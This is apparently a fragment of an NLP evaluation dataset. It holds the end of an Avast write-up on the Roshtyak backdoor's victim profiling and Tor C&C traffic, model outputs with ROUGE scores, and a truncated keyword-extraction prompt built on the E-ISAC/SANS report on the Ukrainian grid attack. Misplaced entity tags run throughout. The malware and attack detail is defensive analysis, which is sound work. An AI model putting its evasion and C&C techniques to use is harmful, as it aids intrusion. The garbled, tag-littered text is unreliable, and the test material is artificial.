exfiltrated to [CARDINAL] one of [ORG] Roshtyak \u2019s [ORG] C&C servers . The exfiltrated pieces of information are listed below , in order of concatenation . External IP address ( obtained during a Tor connectivity check ) A string hardcoded into Roshtyak \u2019s code , e.g. [PERSON] AFF123 ( we ca n\u2019t be sure what \u2019s the meaning behind this , but it looks like an affiliate ID ) A [QUANTITY] 16 - bit hash of the [ORG] DLL [ORG] \u2019s [ORG] PE header ( with some fields zeroed out ) xored with the lower [CARDINAL] 16 bits of its TimeDateStamp . The TimeDateStamp appears to be specially crafted so that the xor results in a known value . This could function as a tamper check or a watermark . Creation timestamp of [WORK_OF_ART] the [WORK_OF_ART] System [WORK_OF_ART] Volume [WORK_OF_ART] Information folder on the system drive The volume serial number of the system drive Processor count ( GetActiveProcessorCount ) IsWow64Process ( _ [ORG] PROCESS_EXTENDED_BASIC_INFORMATION.Flags [ORG] & [ORG] 2)14/16Windows version ( KUSER_SHARED_DATA.Nt(Major|Minor)Version ) Windows product type ( KUSER_SHARED_DATA.NtProductType ) Windows build number ( [CARDINAL] PEB.OSBuildNumber ) Local administrative privileges ( ZwQueryInformationToken(TokenGroups)/CheckTokenMembership , check for DOMAIN_ALIAS_RID_ADMINS ) Domain administrative privileges ( check for [ORG] WinAccountDomainAdminsSid / WinAccountDomainUsersSid ) System time ( KUSER_SHARED_DATA.SystemTime ) Time zone ( KUSER_SHARED_DATA.TimeZoneBias ) [ORG] System locale ( NtQueryDefaultLocale(0 ) ) User locale ( [ORG] NtQueryDefaultLocale(1 ) ) Environment variables ( username , computername , userdomain , userdnsdomain , and logonserver ) [PERSON] Java version ( GetFileVersionInfo(\"javaw.exe \" ) - > VerQueryValue ) Processor information ( cpuid to obtain the Processor Brand String ) Path to the image of the main executable module ( NtQueryVirtualMemory(MemorySectionName ) ) Product ID and serial number of the main physical drive ( DeviceIoControl(IOCTL_STORAGE_QUERY_PROPERTY , [PERSON] StorageDeviceProperty ) ) [ORG] MAC address of the default gateway ( GetBestRoute - > GetIpNetTable ) [ORG] MAC addresses of all network adapters ( GetAdaptersInfo ) Installed antivirus software ( root\\securitycenter2 - > SELECT * FROM AntiVirusProduct ) Display device information ( [ORG] DeviceId , [ORG] DeviceString , [ORG] dmPelsWidth , dmPelsHeight , dmDisplayFrequency ) ( EnumDisplayDevices - > EnumDisplaySettings ) Active processes ( NtQuerySystemInformation(SystemProcessInformation ) ) Screenshot encoded in base64 ( gdi32 method)BeaconingOnce collected , [PERSON] Roshtyak sends the victim profile to one of its [ORG] C&C servers . The profile is sent over the [ORG] Tor network , using a custom comms module Roshtyak injects into a newly spawned process . The [ORG] C&C server processes the exfiltrated profile and might respond with a shellcode payload for the core module to execute . Let \u2019s now take a closer look at this whole process . It \u2019s worth mentioning that before generating any malicious traffic , Roshtyak [ORDINAL] first performs a Tor connectivity check . This is done by contacting [CARDINAL] 28 legitimate and well - known .onion addresses in random order and checking if [CARDINAL] at [CARDINAL] least [CARDINAL] one of them responds . If none of them respond , [PERSON] Roshtyak does n\u2019t even attempt to contact its [ORG] C&C , as it would most likely not get through to it anyway . As for the actual [ORG] C&C communication , [ORG] Roshtyak contains [CARDINAL] 35 hardcoded [CARDINAL] V2 onion addresses ( e.g. ip2djbz3xidmkmkw:53148 , see our [LOC] IoC repository for the full list ) . Like during the connectivity check , Roshtyak iterates through them in random order and attempts to contact each of them until [CARDINAL] one responds . Note that while [CARDINAL] V2 onion addresses are officially deprecated in favor of V3 addresses ( and the Tor Browser no longer supports them in its latest version ) they still appear to be functional enough for [PERSON] Roshtyak \u2019s nefarious purposes . [PERSON] Roshtyak \u2019s hardcoded [ORG] C&C addressesThe victim profile is sent in the URL path , appended to the [CARDINAL] V2 onion address , along with the / character . As the raw profile might contain characters forbidden for use in URLs , the profile is wrapped in a custom structure and encoded using [PERSON] Base64 . The very [ORDINAL] first 0x10 bytes of the custom structure serve as an encryption key , with the rest of the structure being encrypted . The custom structure also contains a [CARDINAL] 64 - bit hash of the victim profile , which presumably serves as an integrity check . Interestingly , the custom structure might get its end padded with random bytes . Note that the full path could be pretty large , as it contains a doubly Base64 - encoded screenshot . The authors of [PERSON] Roshtyak were probably aware that the URL path is not suitable for sending large amounts of data and decided to cap the15/16length of the victim profile at 0x20000 bytes . If the screenshot makes the exfiltrated profile larger than this limit , it is n\u2019t included . When the full onion URL is constructed , [PERSON] Roshtyak goes ahead to launch its Tor comms module . It [ORDINAL] first spawns a dummy process to host the comms module . This dummy process is randomly chosen and can be one of dllhost.exe , regsvr32.exe , or rundll32.exe . The comms module is injected into the newly spawned process using a shared section , obfuscated through the previously described shellcode hiding technique . The comms module is then executed via [ORG] NtQueueApcThreadEx , using the already discussed ntdll gadget trick . The injected comms module is a custom build of an open - source Tor library packed in [CARDINAL] three additional protective shellcode layers . The core module communicates with the comms module using shared sections as an [ORG] IPC mechanism . Both modules synchronously use the same PRNG with the same seed ( [ORG] KUSER_SHARED_DATA.Cookie ) to generate the same section name . Both then map this named section into their respective address spaces and communicate with each other by reading / writing to it . The data read / written into the section is encrypted with RC4 ( the key also generated using the synchronized PRNGs).The communication between the core module and the comms module follows a simple request / response pattern . The core module writes an encrypted onion URL ( including the URL path to exfiltrate ) into the shared section . The comms module then decrypts the URL and makes an HTTP request over Tor to it . The core module waits for the comms module to write the encrypted HTTP response back to the shared section . Once it \u2019s there , the core module decrypts it and unwraps it from a custom format ( which includes decrypting it yet again and computing a hash to check the payload \u2019s integrity ) . The decrypted payload might include a shellcode for the core module to execute . If the shellcode is present , the core module allocates a huge chunk of memory , hides the shellcode there using the shellcode hiding technique , and executes it in a new thread . This new thread is hidden using the NtSetInformationThread - > ThreadHideFromDebugger technique ( including a follow - up anti - hooking check using NtGetInformationThread to confirm that the NtSetInformationThread call did indeed succeed ) . ConclusionIn this blog post , we took a technical deep dive into [PERSON] Roshtyak , the backdoor payload associated with [PERSON] Raspberry [PERSON] Robin . The main focus was to describe how to deal with [PERSON] Roshtyak \u2019s protection mechanisms . We showed some never- before - seen anti - debugger / anti - sandbox / anti - VM tricks and discussed [PERSON] Roshtyak \u2019s heavy obfuscation . We also described [PERSON] Roshtyak \u2019s core functionality . Specifically , we detailed how it establishes persistence , escalates privileges , moves laterally , and uses Tor to download further payloads . We have to admit that reverse engineering [PERSON] Roshtyak was certainly no easy task . The combination of heavy obfuscation and numerous advanced anti - analysis tricks made it a considerable challenge . [PERSON] Nick [PERSON] Harbour , if you \u2019re looking for something to repurpose for [DATE] next [DATE] year [DATE] \u2019s final Flare - On challenge , this might be it . Indicators of Compromise ( IoCs)IoCs are available at url [WORK_OF_ART] Copyright [WORK_OF_ART] \u00a9 [WORK_OF_ART] Avast [WORK_OF_ART] Software s.r.o.16/16", "generated_text": "Avast; the DLL backdoor; use; Raspberry Robin; removable drives; the DLL; 14 protective layers; a specific purpose; a kernel; USB; memory; packages; the backdoor; variants; the Raspberry Robin worm; obfuscation techniques; the worm; the backdoor; files; a unique exploit; a code; the DLL; a command; control; the domain name; backdoors; C2; the system; a sandbox; a new service; a command; control; the backdoor; the exploit; a list; the compromised services; the backdoor; a system shortcut; a startup shortcut; a command; memory; the exploit; a password; the system; a time; a file; a memory; the backdoor; a BIOS; the ransomware; a command.", "ref_text": "<START-1>The PDF discusses the malware Raspberry Robin, specifically focusing on its heavily protected DLL backdoor called Roshtyak. Roshtyak employs numerous advanced anti-analysis techniques to avoid detection, including anti-debugger, anti-sandbox, anti-VM, and anti-emulation checks. If any check succeeds in detecting the analysis environment, Roshtyak will terminate itself, crash intentionally, enter an infinite loop, or execute fake adware payload. The fake payload tricks analysts into thinking the malware is harmless. Roshtyak's code is heavily obfuscated through control flow flattening, function activation keys, variable masking, and other techniques. It is packed in up to 14 layers, each serving a specific protective purpose. The obfuscation hinders static analysis. The core functionality of Roshtyak is to establish persistence, escalate privileges, move laterally, and download additional payloads. The malware uses encrypted kernel exploits to escalate privileges, which are decrypted on demand. Roshtyak downloads PsExec on demand from a specific URL and drops it into a temporary directory under a random name. The payload to be executed by PsExec is a self-extracting package created by a tool called IExpress, which is an ancient Windows installer. It profiles victims by collecting system information and exfiltrating it to C2 servers over Tor. The servers can respond with new shellcode for execution. Reverse engineering Roshtyak is very challenging due to the combination of heavy obfuscation and numerous advanced anti-analysis tricks. The PDF aims to help fellow researchers recognize and respond to similar malware tricks, and harden analysis environments against the described evasion techniques. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4444444444444445, "gpt3/lexical/rouge_rouge2": 0.1899441340782123, "gpt3/lexical/rouge_rougeL": 0.22777777777777777, "gpt3/lexical/rouge_rougeLsum": 0.22777777777777777, "gpt3_generated_text": ["This article discusses a backdoor malware called Roshtyak, which is used by the Raspberry Robin worm to spread through infected removable drives. The malware is highly protected and employs various tricks to evade detection and analysis. It is packed in 14 protective layers, each heavily obfuscated, and includes anti-debugger, anti-sandbox, anti-VM, and anti-emulator checks. If an analysis environment is detected, the malware takes actions such as terminating itself, crashing, entering an infinite loop, or unpacking and loading a fake payload. The article provides a detailed analysis of the malware and its protection techniques. The ultimate objectives and responsible parties behind Raspberry Robin are still unknown."]}, {"split_name": "val", "sample_id": "val_97", "prompt_text": "Extract the keywords: TLP : White Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on [ORG] the [ORG] Ukrainian [ORG] Power [ORG] Grid [ORG] Defense [ORG] Use [ORG] CaseMarch [ORG] 18 , [ORG] 2016Table of [ORG] ContentsPreface iiiSummary of [ORG] Incidents [ORG] ivAttacker [ORG] Tactics [ORG] Techniques [ORG] and [ORG] Procedures Description 1ICS Cyber Kill Chain Mapping 4Defense Lessons Learned \u2013 Passive and Active Defenses [DATE] 11Recommendations [DATE] 18Implications and [ORG] Conclusion [ORG] 20Appendix [ORG] Information [ORG] Evaluation 22E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 2016iiPrefaceAnalysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on [ORG] the [ORG] Ukrainian [ORG] Power [ORG] Grid This is an analysis by a joint team to provide a lessons learned community resource from the cyber attack on the [GPE] Ukrainian power grid . The document is being released as Traffic Light Protocol : [PERSON] White ( TLP : White ) and may be distributed without restriction , subject to copyright controls . This document , the Defense Use Case ( [ORG] DUC ) , summarizes important learning points and presents several mitigation ideas based on publicly available information on [ORG] ICS incidents in [GPE] Ukraine . The E - ISAC and SANS are providing a summary of the available information compiled from multiple publicly available sources as well as analysis performed by the SANS team in relation to this event.1 This document provides specific mitigation concepts for power system [PERSON] Supervisory [PERSON] Control and [ORG] Data [ORG] Acquisition ( [ORG] SCADA ) defense , as well as a general learning opportunity for [ORG] ICS defenders . Authors , working with the E - ISAC : [PERSON] Robert [PERSON] M. [PERSON] Lee , SANS [PERSON] Michael [PERSON] J. [PERSON] Assante , SANS [PERSON] Tim [PERSON] Conway , SANS1 The SANS investigation into this incident should not be confused with the [GPE] U.S. interagency team investigation or any other organization or company \u2019s efforts to include the E - ISAC \u2019s past reporting . SANS [ORG] ICS team has been analyzing the data on their own since [DATE] December 25 , [DATE] 2015 , and has provided its analysis to the wider community . This document is provided to E - ISAC and the [NORP] North [NORP] American electricity sector to benefit its members and the larger critical infrastructure community . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 2016iiiSummary of IncidentsOn [DATE] December [DATE] 23 , [DATE] 2015 , the Ukrainian Kyivoblenergo , a regional electricity distribution company , reported service outages to customers . The outages were due to a [ORDINAL] third party \u2019s illegal entry into the company \u2019s computer and [ORG] SCADA systems : Starting at [TIME] approximately [TIME] 3:35 [TIME] p.m. local time , [CARDINAL] seven 110 kV and [CARDINAL] 23 [CARDINAL] 35 kV substations were disconnected for [TIME] three [TIME] hours . Later statements indicated that the cyber attack impacted additional portions of the distribution grid and forced operators to switch to manual mode.2 , [CARDINAL] 3 The event was elaborated on by the [NORP] Ukrainian news media , who conducted interviews and determined that a foreign attacker remotely controlled the [GPE] SCADA distribution management system.4 The outages were originally thought to have affected [CARDINAL] approximately [CARDINAL] 80,000 customers , based on the Kyivoblenergo \u2019s update to customers . However , later it was revealed that [CARDINAL] three different distribution oblenergos ( a term used to describe an energy company ) were attacked , resulting in several outages that caused [CARDINAL] approximately [CARDINAL] 225,000 customers to lose power across various areas.5 , [CARDINAL] 6Shortly after the attack , [NORP] Ukrainian government officials claimed the outages were caused by a cyber attack , and that [NORP] Russian security services were responsible for the incidents.7 Following these claims , investigators in [GPE] Ukraine , as well as private companies and the [GPE] U.S. government , performed analysis and offered assistance to determine the root cause of the outage.8 Both the E - ISAC and SANS [ORG] ICS team was involved in various efforts and analyses in relation to this case since [DATE] December 25 , [DATE] 2015 , working with trusted members and organizations in This joint report consolidates the open source information , clarifying important details surrounding the attack , offering lessons learned , and recommending approaches to help the [ORG] ICS community repel similar attacks . This report does not focus on attribution of the attack.2 url [CARDINAL] 3 url [CARDINAL] 4 url [CARDINAL] 5 url [CARDINAL] 6 url [CARDINAL] 7 url [CARDINAL] 8 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 2016ivSummary of Information and Reporting On [DATE] December [DATE] 24 , [DATE] 2015 , [ORG] TSN ( a [NORP] Ukrainian news outlet ) released the report \u201c Due to a Hacker Attack Half of [ORG] the Ivano - Frankivsk [ORG] Region is De - Energized . \u201d9 Numerous reporting agencies and independent bloggers from [ORG] the [ORG] Washington [ORG] Post , [ORG] SANS [ORG] Institute , [ORG] New [ORG] York [ORG] Times , ARS Technica , [ORG] BBC , [GPE] Wired , [ORG] CNN , [ORG] Fox [ORG] News , and the E - ISAC Report have followed up on the initial [ORG] TSN [ORG] report.10 These subsequent reports have collectively provided details of a cyber attack that targeted the [GPE] Ukrainian electric system . [ORG] The [ORG] U.S. [ORG] Department [ORG] of [ORG] Homeland [ORG] Security ( DHS ) issued a formal report on [DATE] February 25 , [DATE] 2016 , titled IR - ALERT - H-16 - 056 - 01.11 Based on the [ORG] DHS report , [CARDINAL] three [NORP] Ukrainian oblenergos experienced coordinated cyber attacks that were executed within [TIME] 30 [TIME] minutes of each other . The attack impacted [CARDINAL] 225,000 customers and required the oblenergos to move to manual operations in response to the attack . The oblenergos were reportedly able to restore service quickly after an outage window lasting several hours.12 The [ORG] DHS report states that , while electrical service was restored , the impacted oblenergos continue to operate their distribution systems in an operationally constrained mode . Within the [NORP] Ukrainian electrical system , these attacks were directed at the regional distribution level , as shown in Figure 1.Figure [CARDINAL] 1 : Electric System Overview9 url [CARDINAL] 10 E - ISAC : Mitigating Adversarial Manipulation of [ORG] Industrial [ORG] Control [ORG] Systems as [ORG] Evidenced by [ORG] Recent [ORG] International [ORG] Events , [DATE] February [DATE] 9 , [DATE] 2016 ( TLP = RED ) [CARDINAL] 11 url [CARDINAL] 12 url ukraine/2016/01/05/4056a4dc - b3de-11e5 - a842 - 0feb51d1d124 story.htmlE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [DATE] 2016vSummary of [ORG] IncidentsSee the [ORG] Appendix for an evaluation of the credibility and amount of technical information that is publicly The cyber attacks in [GPE] Ukraine are the [ORDINAL] first publicly acknowledged incidents to result in power outages . As future attacks may occur , it is important to scope the impacts of the incident . Power outages should be measured in scale ( number of customers and amount of electricity infrastructure involved ) and in duration to full restoration . The [NORP] Ukrainian incidents affected [CARDINAL] up [CARDINAL] to [CARDINAL] 225,000 customers in [CARDINAL] three different distribution - level service territories and lasted for [TIME] several [TIME] hours . These incidents should be rated on a macro scale as low in terms of power system impacts as the outage affected a very small number of overall power consumers in [GPE] Ukraine and the duration was limited . In contrast , it is likely that the impacted companies rate these incidents as high or critical to the reliability of their systems and business operations . E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 2016viAttacker [ORG] Tactics [ORG] Techniques [ORG] and [ORG] Procedures DescriptionDirect attribution is unnecessary to learn from this attack and to consider mitigation strategies ; it is only necessary to use the mental model of how the cyber actor works to understand the capabilities and general profile against which one is defending . The motive and sophistication of this power grid attack is consistent with a highly structured and resourced actor . This actor was co - adaptive and demonstrated varying tactics and techniques to match the defenses and environment of the [CARDINAL] three impacted targets . The mitigation section of this document provides mitigation concepts related to the attack and how to develop a more lasting mitigation strategy by anticipating future attacks . The attackers demonstrated a variety of capabilities , including spear phishing emails , variants of the BlackEnergy 3 malware , and the manipulation of [ORG] Microsoft [ORG] Office documents that contained the malware to gain a foothold into [ORG] the [ORG] Information [ORG] Technology ( IT ) networks of the electricity companies.13 They demonstrated the capability to gain a foothold and harvest credentials and information to gain access to the [ORG] ICS network . Additionally , the attackers showed expertise , not only in network connected infrastructure ; such as [ORG] Uninterruptable [ORG] Power [ORG] Supplies ( [PERSON] UPSs ) , but also in operating the ICSs through supervisory control system ; such as [ORG] the [ORG] Human [ORG] Machine [ORG] Interface ( [ORG] HMI ) , as shown in Figure [CARDINAL] 2.Figure [CARDINAL] 2 : [ORG] Control [ORG] & [ORG] Operate : [ORG] SCADA [ORG] Hijacking [ORG] TechniquesFinally , the adversaries demonstrated the capability and willingness to target field devices at substations , write custom malicious firmware , and render the devices , such as serial - to - ethernet convertors , inoperable and13 For a discussion around the history of the BlackEnergy 3 malware and [ORG] Sandworm team see the SANS ICS webcast with iSight here : url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 20161Attacker [ORG] Tactics [ORG] Techniques [ORG] and [ORG] Procedures Descriptionunrecoverable.14 In [CARDINAL] one case , the attackers also used telephone systems to generate [CARDINAL] thousands of calls to the energy company \u2019s call center to deny access to customers reporting outages . However , the strongest capability of the attackers was not in their choice of tools or in their expertise , but in their capability to perform long - term reconnaissance operations required to learn the environment and execute a highly synchronized , multistage , The following is a consolidated list of the technical components used by the attackers , graphically depicted in Figure [CARDINAL] 3 : Identification of BlackEnergy 3 at each of the impacted [LAW] oblenergos\uf0b7 [LAW] Spear phishing to gain access to the business networks of the oblenergos \uf0b7 \uf0b7 Theft of credentials from the business networks [CARDINAL] \uf0b7 The use of virtual private networks ( VPNs ) to enter the [ORG] ICS network \uf0b7 The use of existing remote access tools within the environment or issuing commands directly from aremote station similar to an operator HMI\uf0b7 Serial - to - ethernet communications devices impacted at a firmware level15 \uf0b7 The use of a modified [PRODUCT] KillDisk to erase the master boot record of impacted organization systems as wellas the targeted deletion of some logs16\uf0b7 Utilizing UPS systems to impact connected load with a scheduled service outage \uf0b7 Telephone denial - of - service attack on the call centerFigure [CARDINAL] 3 : [ORG] Ukraine [ORG] Attack [ORG] Consolidated [ORG] Technical [ORG] ComponentsAt various points in the public reporting on the attack , organizations have indicated that [ORG] BlackEnergy 3 and [PRODUCT] KillDisk itself could be directly responsible for the outage . [CARDINAL] One of the items specifically highlighted to support14url id=24508688 6&cat id=35109 [CARDINAL] 15 To learn about serial to ethernet converters and the types of vulnerabilities that exist to them see DigitalBond \u2019s Basecamp report here : url [CARDINAL] 16 url organizationsE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20162Attacker Tactics Techniques and Procedures Descriptionlinked to serial - to - ethernet this theory was that [PRODUCT] KillDisk deleted a process on Windows systems communications.17 Regardless of the impact of the [GPE] SCADA network environment , neither [PRODUCT] BlackEnergy [PRODUCT] 3 nor [ORG] KillDisk contained the required components to cause the outage . The outages were caused by the use of the control systems and their software through direct interaction by the adversary . All other tools and technology , such as [ORG] BlackEnergy 3 and [PRODUCT] KillDisk , were used to enable the attack or delay restoration efforts . Multiple opportunities existed for the adversary to execute its attack . External to the oblenergos and prior to the attack , there was a variety of open - source information available ; including a detailed list of types of infrastructure such as [ORG] Remote [ORG] Terminal [ORG] Unit ( RTU ) vendors and versions posted online by [ORG] ICS vendors.18 The VPNs into the [ORG] ICS from the business network appear to lack [CARDINAL] two - factor authentication . Additionally , the firewall allowed the adversary to remote admin out of the environment by utilizing a remote access capability native to the systems . In addition , based on media reporting , there did not appear to be any resident capability to continually monitor the [ORG] ICS network and search for abnormalities and threats through active defense measures ; like network security monitoring . These vulnerabilities would have provided the adversary the opportunity to persist within the environment for [DATE] six [DATE] months or more to conduct reconnaissance on the environment and subsequently execute [GPE] the [GPE] attack.19 [GPE] Based on the details provided in the [ORG] DHS report , the adversary used a consistent attack approach on all [CARDINAL] three impacted targets . The adversary also used consistent tactics to impact field controllable elements and irreparably damage field devices . Why these oblenergos were targeted remains an open debate . Based on the public reporting , it is unknown if the targets were selected based on common technologies in use , system architectures , reconnaissance operations , or service territories . Opportunity - based considerations for selecting a specific target may focus on an attacker \u2019s confidence and ability to cause an [ORG] ICS effect . Some example decision factors could include:\uf0b7 Targets with common systems and [ORG] configurations\uf0b7 [ORG] Multiple systems with common centralized control points\uf0b7ICS impact duration estimates ( e.g. , long term or short term)\uf0b7 Existing capabilities required to achieve desired [ORG] results\uf0b7 [ORG] Risk level of performing the operation and being [PERSON] discovered\uf0b7 [PERSON] Achieved access and ability to move and act within the environment17 url outage - in - ukraine/ [CARDINAL] 18 url [CARDINAL] 19 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20163ICS Cyber Kill Chain MappingThe ICS Cyber Kill Chain was published by SANS in [DATE] 2015 by [PERSON] Michael [PERSON] Assante and [PERSON] Robert [PERSON] M. [PERSON] Lee as an adaptation of the traditional cyber kill chain developed by [PERSON] Lockheed [PERSON] Martin analysts as it applied to ICSs.20 The ICS Cyber Kill Chain details the steps an adversary must follow to perform a high - confidence attack on the [ORG] ICS process and/or cause physical damage to equipment in a predictable and controllable way , as displayed in Figure [CARDINAL] 4.Figure [CARDINAL] 4 : The ICS Cyber Kill Chain with Stage [CARDINAL] 1 [ORG] HighlightedThe attack on the [GPE] Ukrainian power grid followed the ICS Cyber Kill Chain completely throughout Stage 1 and Stage 2 . The attack gained access to each level of the [ORG] ICS , as shown in Figure [CARDINAL] 5 , with the ICS Cyber Kill Chain plotted alongside a segmentation / hierarchy model ( e.g. , modified [PERSON] Purdue [PERSON] Model ) . Completing Stage 1 entails a successful cyber intrusion or breach into an [ORG] ICS system , but is not characterized as an [ORG] ICS attack . Completion of Stage 2 completed the [ORG] ICS [ORG] Kill [ORG] Chain , resulting in a successful cyber attack that led to an impact on the operations of the [ORG] ICS . The next section includes a discussion of the [CARDINAL] two stages using currently available information from the attack.20 url | Analysis of the Cyber Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 20164ICS Cyber Kill Chain MappingFigure 5 : [GPE] Ukraine Cyber Attack ICS Cyber Kill Chain and [ORG] Purdue [ORG] Model [ORG] Mapping21ICS Cyber Kill Chain Mapping \u2013 Stage 1 The [ORDINAL] first step in Stage 1 is Reconnaissance . There were no reports of observed reconnaissance having taken place prior to targeting the energy companies . However , an analysis of the [CARDINAL] three impacted organizations shows they were particularly interesting targets due to the levels of automation in their distribution system ; enabling the remote opening of breakers in a number of substations . Additionally , the targeting and final attack plan for the electricity companies in general were highly coordinated , which indicates that reconnaissance took place at some point . This was very unlikely to have been an opportunistic attack . The [ORDINAL] second step is Weaponization and/or Targeting . Targeting would normally take place when no weaponization is needed ; such as directly accessing internet connected devices . In this attack , it does not appear that targeting of specific infrastructure was necessary to gain access . Instead , the adversaries weaponized [ORG] Microsoft [ORG] Office documents ( [PRODUCT] Excel and Word ) by embedding [LAW] BlackEnergy [LAW] 3 within [ORG] the [ORG] documents.22 [ORG] Samples [ORG] of [ORG] Excel and other office documents have been recovered from the broader access campaign that targeted a multitude of organizations in [GPE] Ukraine ; including Office documents used in the specific attack against the [CARDINAL] three electricity companies.23 , [CARDINAL] 24 During the cyber intrusion stage of [ORG] Delivery , [GPE] Exploit , and [ORG] Install , the malicious [ORG] Office documents were [PERSON] delivered21 [PERSON] Note , the exact architectures of the impacted utilities are not represented in the figure . [ORG] The [ORG] Purdue [ORG] Model is a standard way of viewing different zones of a well - constructed [ORG] ICS . [CARDINAL] 22 url [CARDINAL] 23 url 24 Those looking for Indicators of Compromise for the word document , command and control servers , and the malware should look to E- ISAC , [ORG] ICS - CERT , and iSight private reporting as well as public reporting from [PERSON] Kaspersky [PERSON] Labs , ESET , and [PERSON] CYS [PERSON] Centrum reference : url energy [CARDINAL] 2 [CARDINAL] 3 url ukraine - employ - spearphishing - with - word - documents / andE - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20165ICS Cyber Kill Chain Mappingvia email to individuals in the administrative or IT network of the electricity companies . When these documents were opened , a popup was displayed to users to encourage them to enable the macros in the document as shown in Figure [CARDINAL] 6.25 Enabling the macros allowed the malware to [ORG] Exploit [ORG] Office macro functionality to install [LAW] BlackEnergy [LAW] 3 on the victim system and was not an exploit of a vulnerability through exploit code . There was no observed exploit code in this incident . The theme of using available functionality in the system was present throughout the adversary \u2019s kill chain . Figure [CARDINAL] 6 : A Sample of a BlackEnergy 3 Infected [ORG] Microsoft [ORG] Office Document26Upon the [ORG] Install step , the [ORG] BlackEnergy 3 malware connected to command and control ( C2 ) IP addresses to enable communication by the adversary with the malware and the infected systems . These pathways allowed the adversary to gather information from the environment and enable access . The attackers appear to have gained access [DATE] more [DATE] than [DATE] six [DATE] months prior to December 23 , 2015 , when the power outage occurred.27 [CARDINAL] One of their [ORDINAL] first actions happened when the network was to harvest credentials , escalate privileges , and move laterally throughout the environment ( e.g. , target directory service infrastructure to directly manipulate and control the authentication and authorization system ) . At this point , the adversary completed all actions to establish persistent access to the targets . While the initial footholds were used to harvest legitimate credentials for pivoting and systematic takeover of IT systems and remote connections , it is likely that the attackers moved quickly away from their initial footholds and vulnerable C2s in an effort to blend into the target \u2019s systems as authorized users . With this information , the attackers would be able to identify [ORG] VPN connections and avenues from the business network into the [ORG] ICS network . Using native connections and commands allows the attackers to discover the remainder of the systems and extract data necessary to formulate a plan for Stage [CARDINAL] 2.25 For a detailed understanding of the infected [ORG] Microsoft [ORG] Office documents and the malicious payload see [PERSON] Kaspersky Lab \u2019s write - up here : url [CARDINAL] 26 url [CARDINAL] 27url | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , 20166ICS Cyber Kill Chain Mappingthe networkinSpeculation There was not enough publicly available information to determine how diversified the adversary \u2019s attack was to include how many different types of devices were impacted at the firmware level . However , through publicly available information about the [NORP] Ukrainian networks , as well as knowledge of similar electric distribution systems , it is likely that there was a diverse hardware and software environment . It is suspected that the administrative and [ORG] ICS networks contained multiple OS versions such as Windows XP and Windows 7 , multiple types of RTUs and gateways , and various industrial switches . Using the stolen credentials , the adversary was able to pivot segments where [ORG] SCADA dispatch into workstations and servers existed . Upon entry into the network , the actions of the adversaries were consistent in theme but different in technical minutia between the [CARDINAL] three impacted oblenergoss . In [CARDINAL] at [CARDINAL] least [CARDINAL] one of the oblenergos , the attackers discovered a network connected to a UPS and reconfigured it so that when the attacker caused a power outage , it was followed by an event that would also impact the power the energy company \u2019s buildings or data There is not sufficient information available to identify if any information was exfiltrated from the environment , but the adversary demonstrated a capability in Stage 2 that indicates internal discovery was performed . This reconnaissance would have needed to include discovering field devices such as the serial - to - ethernet devices used to interpret commands from the [GPE] SCADA network to the substation control systems . Additionally , the [CARDINAL] three oblenergos used different distribution management systems ( DMSs ) , and the attackers would have needed to perform some network reconnaissance against these systems and find specific targets to execute their highly coordinated attack.28 [ORG] ICS [ORG] Cyber [ORG] Kill [ORG] Chain [ORG] Mapping [ORG] \u2013 [ORG] Stage [ORG] 2 In most cases , the [ORG] Develop stage occurs in the adversary \u2019s networks , thereby limiting any available forensic information , but the attack that follows this stage can reveal a lot about the adversarial process . In [ORG] the [ORG] Attack [ORG] Development [ORG] and [ORG] Tuning [ORG] Stage [ORG] of [ORG] Stage [ORG] 2 , the attackers executed the [ORG] Develop step in [CARDINAL] at [CARDINAL] least [CARDINAL] two ways . [ORDINAL] First , they learned how to interact with the [CARDINAL] three distinct [ORG] DMS environments using the native control present in the system and operator screens . [ORDINAL] Second , and more importantly , they developed malicious firmware for the serial- to - ethernet devices.29 Currently available information indicates that the malicious firmware was consistent amongst devices and uploaded within short periods of each other to multiple sites . Therefore , the malicious uploads of firmware was likely developed prior to the attack for quick and predictable execution . E - ISAC and the SANS ICS team assess with high confidence that , during [ORG] the [ORG] Validation [ORG] Stage [ORG] of [ORG] Stage [ORG] 2 , the adversary did Test their capabilities prior to their deployment . It is possible that the adversaries were able to execute this with pure luck , but it is highly unlikely and inconsistent with the professionalism observed throughout the rest of the attack . The adversaries likely had systems in their organization that they were able to evaluate and test their firmware against prior to executing on [DATE] December [DATE] 23rd.28 The [CARDINAL] three different [ORG] DMS vendors were discoverable via open - source searching . The names of the vendors are being withheld as it is not important to the discussion of the attack . There were no exploits leveraged against these vendors but they were simply abused with direct access . 29url id=24508688 [CARDINAL] 6&cat id=35109E - ISAC | Analysis of [WORK_OF_ART] the [WORK_OF_ART] Cyber [WORK_OF_ART] Attack on the Ukrainian Power Grid | [DATE] March [DATE] 18 , [CARDINAL] 20167ICS Cyber Kill Chain MappingDuring the ICS Attack Stage , the adversaries used native software to Deliver themselves into the environment for 